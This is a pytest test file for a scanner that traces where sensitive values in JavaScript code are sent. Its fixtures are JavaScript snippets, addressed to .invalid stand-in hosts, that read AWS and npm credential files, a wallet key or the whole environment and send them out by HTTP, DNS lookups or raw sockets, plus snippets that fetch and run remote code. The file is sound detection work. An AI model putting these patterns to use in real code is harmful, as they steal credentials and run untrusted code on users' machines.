"""Where a JavaScript file's sensitive values go (`detect/js_flow.py`).

Fixtures name hosts under `.invalid` and assemble command words, so the repository's own scan has
nothing to report in them.
"""

from __future__ import annotations

import time
from typing import ClassVar

import pytest

from cordon_scanner.analysis.javascript.js_flow import JsFlow, _Analysis


class FlowKit:
    @staticmethod
    def flows(text: str) -> list[tuple[list[str], str, str]]:
        return [(sorted(f.sources), f.sink, f.destination) for f in JsFlow.flows(text)]


class TestSources:
    def test_a_credential_file_through_two_helpers(self) -> None:
        text = (
            'const fs = require("fs");\n'
            "function load(p) { return fs.readFileSync(p); }\n"
            'function enc(x) { return Buffer.from(x).toString("base64"); }\n'
            'function send(d) { return require("axios").post("https://a.invalid/u", {d}); }\n'
            'const p = require("path").join(require("os").homedir(), ".aws", "credentials");\n'
            "send(enc(load(p)));\n"
        )
        assert (["home_file", "secret_file"], "request", "fixed") in FlowKit.flows(text)

    def test_a_file_read_in_a_callback(self) -> None:
        text = (
            'const fs = require("fs"); const https = require("https");\n'
            'fs.readFile(process.env.HOME + "/.npmrc", "utf8", (err, txt) => {\n'
            '  const req = https.request({hostname: "h.invalid", method: "POST"});\n'
            "  req.write(txt); req.end();\n"
            "});\n"
        )
        assert any("secret_file" in s for s, _, _ in FlowKit.flows(text))

    def test_a_key_handed_to_a_function_as_private_key(self) -> None:
        text = (
            "export async function createWallet(privateKey) {\n"
            '  await fetch("https://api.invalid/log", {method: "POST", body: privateKey});\n'
            "}\n"
        )
        assert FlowKit.flows(text) == [(["wallet_key"], "request", "fixed")]

    def test_the_whole_environment_in_a_lookup(self) -> None:
        text = (
            'const dns = require("dns");\n'
            'const h = Buffer.from(JSON.stringify(process.env)).toString("hex") + ".x.invalid";\n'
            "dns.lookup(h, () => {});\n"
        )
        assert FlowKit.flows(text) == [(["environment"], "dns", "unknown")]


class TestRemoteCode:
    def test_a_reply_run_through_vm_under_another_name(self) -> None:
        text = (
            'var salt = require("https"); var mk = require("vm");\n'
            'salt.request("https://x.invalid/p", {}, (res) => {\n'
            '  let body = "";\n'
            '  res.on("data", (p) => body += p);\n'
            '  res.on("end", () => mk.runInContext(body, mk.createContext({})));\n'
            "});\n"
        )
        assert (["network_response"], "execute", "unknown") in FlowKit.flows(text)

    def test_a_promise_chain_into_new_function(self) -> None:
        text = 'const axios = require("axios");\naxios.get("https://x.invalid/s").then(r => { new Function(r.data)(); });\n'
        assert (["network_response"], "execute", "unknown") in FlowKit.flows(text)

    def test_a_reply_that_is_only_parsed_is_quiet(self) -> None:
        text = 'async function go() {\n  const r = await fetch("https://api.invalid/x");\n  console.log(await r.json());\n}\n'
        assert FlowKit.flows(text) == []


class TestQuiet:
    def test_a_client_sending_its_own_token(self) -> None:
        text = (
            'const axios = require("axios");\nconst token = process.env.GITHUB_TOKEN;\n'
            'module.exports = (q) => axios.get("https://api.github.com/search?q=" + q, {headers: {Authorization: token}});\n'
        )
        assert FlowKit.flows(text) == []

    def test_a_config_file_in_the_project(self) -> None:
        text = 'const fs = require("fs");\nconst cfg = JSON.parse(fs.readFileSync("./config.json"));\nfetch(cfg.url, {body: JSON.stringify(cfg)});\n'
        assert FlowKit.flows(text) == []


class TestDestinations:
    def test_known_drop_points_bare_addresses_and_private_ranges(self) -> None:
        assert _Analysis.classify("https://webhook.site/abc")[1] == "drop"
        assert _Analysis.classify("https://discord.com/api/webhooks/1/x")[1] == "drop"
        assert _Analysis.classify("https://discord.com/app")[1] == "fixed"
        assert _Analysis.classify("http://203.0.113.9/x")[1] == "ip"
        assert _Analysis.classify("http://127.0.0.1:9222/json")[1] == "fixed"
        assert _Analysis.classify("plain text mentioning toast.js")[1] == "unknown"


class TestSpellings:
    """The same flow however the module, the call or the URL is written (review 98, 21-DATAFLOW
    D1). Each case was missed before."""

    SEND = 'fetch("https://a.invalid/u", {method: "POST", body: %s});\n'
    CASES: ClassVar[dict[str, str]] = {
        "tsc call": 'const os_1 = require("os");\n' + SEND % "(0, os_1.hostname)()",
        "tsc import helper": 'const os_1 = __importDefault(require("os"));\n'
        + SEND % "os_1.default.hostname()",
        "esbuild": 'var import_os = __toESM(require("os"));\n'
        + SEND % "import_os.default.hostname()",
        "destructured require": 'const { hostname } = require("os");\n' + SEND % "hostname()",
        "ES named import": 'import { hostname as h } from "os";\n' + SEND % "h()",
        "class method": 'const os = require("os");\n'
        "class T { a() { return os.hostname(); } b() { "
        + SEND.strip() % "this.a()"
        + " } }\nnew T().b();\n",
        "instance field": 'const os = require("os");\n'
        "class T { constructor() { this.h = os.hostname(); } b() { "
        + SEND.strip() % "this.h"
        + " } }\n",
        "template URL": 'const os = require("os");\nfetch(`https://a.invalid/u?h=${os.hostname()}`);\n',
        "client instance": 'const axios = require("axios"); const os = require("os");\n'
        'const c = axios.create({baseURL: "https://a.invalid"});\nc.post("/u", {h: os.hostname()});\n',
        "chained end": 'const https = require("https"); const os = require("os");\n'
        'https.request({hostname: "a.invalid", method: "POST"}).end(os.hostname());\n',
        "destructured file read": 'const { readFileSync } = require("fs");\n'
        + SEND % 'readFileSync(require("os").homedir() + "/.npmrc")',
    }

    @pytest.mark.parametrize("name", sorted(CASES))
    def test_followed(self, name: str) -> None:
        assert any(
            sink == "request" and sources for sources, sink, _ in FlowKit.flows(self.CASES[name])
        )

    def test_template_text_is_not_code(self) -> None:
        # `//` inside the template's text no longer hides what follows it on the line.
        text = 'const os = require("os");\nconst u = `https://a.invalid/${os.hostname()}`;\nfetch(u);\n'
        assert FlowKit.flows(text) == [(["identity"], "request", "unknown")]

    def test_quiet_when_nothing_sensitive_is_carried(self) -> None:
        text = (
            'const path_1 = __importDefault(require("path"));\n'
            "class T { a() { return path_1.default.join('a', 'b'); } b() { "
            + self.SEND.strip() % "`${this.a()}/x`"
            + " } }\n"
        )
        assert FlowKit.flows(text) == []


class TestSockets:
    """What is written to a raw socket (net, tls, dgram) leaves as it is: the `connection` sink
    the raw-channel rules read. Every such write was a `request`, and `new net.Socket()` was no
    sink at all, so those rules could not fire on a socket (review 98, 2026-10-20)."""

    HEAD = 'const os = require("os");\nconst net = require("net"); const tls = require("tls");\n'
    RAW: ClassVar[dict[str, str]] = {
        "bound": 'const s = net.connect(9, "h.invalid");\ns.write(os.hostname());\n',
        "chained": 'net.connect(9, "h.invalid").write(os.hostname());\n',
        "createConnection": 'net.createConnection(9, "h.invalid").end(os.hostname());\n',
        "in the connect callback": (
            'const s = net.connect(9, "h.invalid", () => { s.write(os.hostname()); });\n'
        ),
        "tls": 'const s = tls.connect(443, "h.invalid");\ns.write(os.hostname());\n',
        "new Socket": (
            'const s = new net.Socket();\ns.connect(9, "h.invalid");\ns.write(os.hostname());\n'
        ),
    }

    @pytest.mark.parametrize("name", sorted(RAW))
    def test_a_raw_socket_write_is_a_connection(self, name: str) -> None:
        assert FlowKit.flows(self.HEAD + self.RAW[name])[0][:2] == (["identity"], "connection")

    def test_an_http_request_is_still_a_request(self) -> None:
        text = (
            'const os = require("os"); const https = require("https");\n'
            'https.request({hostname: "h.invalid"}).end(os.hostname());\n'
        )
        assert FlowKit.flows(text)[0][:2] == (["identity"], "request")

    #: What opening an HTTP request sends -- its path, query, headers -- is a request too: read
    #: as a raw socket, a licence check sending a key in its query string was a payload's channel
    #: (review 98 P1 A/B, 2026-10-20).
    OPENS: ClassVar[dict[str, str]] = {
        "request options": 'https.request({hostname: "h.invalid", path: "/l?k=" + os.hostname()});\n',
        "get URL": 'http.get("http://h.invalid/l?k=" + os.hostname());\n',
        "required inline": 'require("https").get("https://h.invalid/l?k=" + os.hostname());\n',
    }

    @pytest.mark.parametrize("name", sorted(OPENS))
    def test_what_opening_an_http_request_sends_is_a_request(self, name: str) -> None:
        text = (
            'const os = require("os");\n'
            'const http = require("http"); const https = require("https");\n' + self.OPENS[name]
        )
        assert FlowKit.flows(text)[0][:2] == (["identity"], "request")

    @pytest.mark.parametrize("host", ["127.0.0.1", "localhost", "::1"])
    def test_a_socket_to_this_machine_is_not_a_channel(self, host: str) -> None:
        text = self.HEAD + f'net.createConnection(9, "{host}").write(os.hostname());\n'
        assert FlowKit.flows(text)[0][:2] == (["identity"], "request")


class TestIdentityAsDestination:
    """The machine's own name or address as where a call goes -- a socket bound to the host's
    name, a printer scan, NAT-PMP to the gateway, a router's own API -- is not identity sent
    (review 98 P1 A/B: five benign tools). In a path, a body or a name's labels it still is."""

    HEAD = (
        'const os = require("os"); const dns = require("dns"); const net = require("net");\n'
        'const dgram = require("dgram"); const http = require("http");\n'
        "const ip = os.networkInterfaces().en0[0].address;\n"
    )
    DESTINATIONS: ClassVar[dict[str, str]] = {
        "own name looked up": "dns.lookup(os.hostname(), (e, a) => {});\n",
        "socket host option": "net.connect({host: ip, port: 9100});\n",
        "socket shorthand": "const host = ip;\nnet.connect({host, port: 9100});\n",
        "socket positional": "net.connect(9100, ip);\n",
        "datagram address": 'const s = dgram.createSocket("udp4");\ns.send(Buffer.from("x"), 5351, ip);\n',
        "request hostname": 'http.request({hostname: ip, path: "/tr064"});\n',
        "local address": 'http.request({host: "h.invalid", localAddress: ip});\n',
        "interfaces walked": (
            "const ifs = os.networkInterfaces();\n"
            "for (const name of Object.keys(ifs)) {\n"
            "  for (const i of ifs[name]) { net.connect({host: i.address, port: 631}); }\n"
            "}\n"
        ),
        "destructured": (
            "const { address } = os.networkInterfaces().en0[0];\nnet.connect(9100, address);\n"
        ),
    }
    SENT: ClassVar[dict[str, str]] = {
        "name labels": 'dns.lookup(os.hostname() + ".x.invalid", () => {});\n',
        "name labels in a template": "dns.lookup(`${os.hostname()}.x.invalid`, () => {});\n",
        "path": 'http.request({hostname: "h.invalid", path: "/p?h=" + os.hostname()});\n',
        "hostname labels": 'http.request({hostname: os.hostname() + ".x.invalid"});\n',
        # How a DNS beacon is usually written: its name built first, then handed over bare.
        "name built first": 'const h = os.hostname() + ".x.invalid";\ndns.lookup(h, () => {});\n',
        "name built in a template": "const h = `${os.hostname()}.x.invalid`;\ndns.lookup(h, () => {});\n",
        "name joined": (
            'const n = [os.userInfo().username, os.hostname(), "x", "invalid"].join(".");\n'
            "dns.resolve(n, () => {});\n"
        ),
        "name joined by a variable": (
            "const parts = [os.userInfo().username, os.hostname()];\n"
            "const n = parts.join(sep);\ndns.resolve(n, () => {});\n"
        ),
        "name through two bindings": (
            'const a = os.hostname() + ".x.invalid"; const b = a;\ndns.lookup(b, () => {});\n'
        ),
        "name appended to": 'let h = os.hostname();\nh += ".x.invalid";\ndns.lookup(h, () => {});\n',
        "name built by a helper": (
            'function d(x) { return x + ".x.invalid"; }\ndns.lookup(d(os.hostname()), () => {});\n'
        ),
        "name passed in": (
            'function ping(h) { dns.lookup(h, () => {}); }\nping(os.hostname() + ".x.invalid");\n'
        ),
        "socket write": 'const s = net.connect(9, "h.invalid");\ns.write(os.hostname());\n',
        "datagram payload": (
            'const s = dgram.createSocket("udp4");\n'
            's.send(Buffer.from(os.hostname()), 53, "h.invalid");\n'
        ),
        "request body": (
            'const r = http.request({hostname: "h.invalid"});\n'
            "r.end(JSON.stringify({h: os.hostname()}));\n"
        ),
    }

    @pytest.mark.parametrize("name", sorted(DESTINATIONS))
    def test_where_a_call_goes_is_not_sent(self, name: str) -> None:
        flows = FlowKit.flows(self.HEAD + self.DESTINATIONS[name])
        assert not [f for f in flows if "identity" in f[0]]

    @pytest.mark.parametrize("name", sorted(SENT))
    def test_what_a_call_carries_is_sent(self, name: str) -> None:
        flows = FlowKit.flows(self.HEAD + self.SENT[name])
        assert [f for f in flows if "identity" in f[0]]


class TestBounds:
    def test_a_large_generated_file_finishes(self) -> None:
        text = "".join(f"function f{i}(a) {{ return g{i}(a) + {i}; }}\n" for i in range(20_000))
        assert JsFlow.flows(text) == []

    def test_templates_nested_past_the_limit_finish(self) -> None:
        deep = "x = " + "`a${" * 5_000 + "1" + "}`" * 5_000 + ";\n"
        started = time.monotonic()
        assert JsFlow.flows(deep) == []
        assert time.monotonic() - started < 5
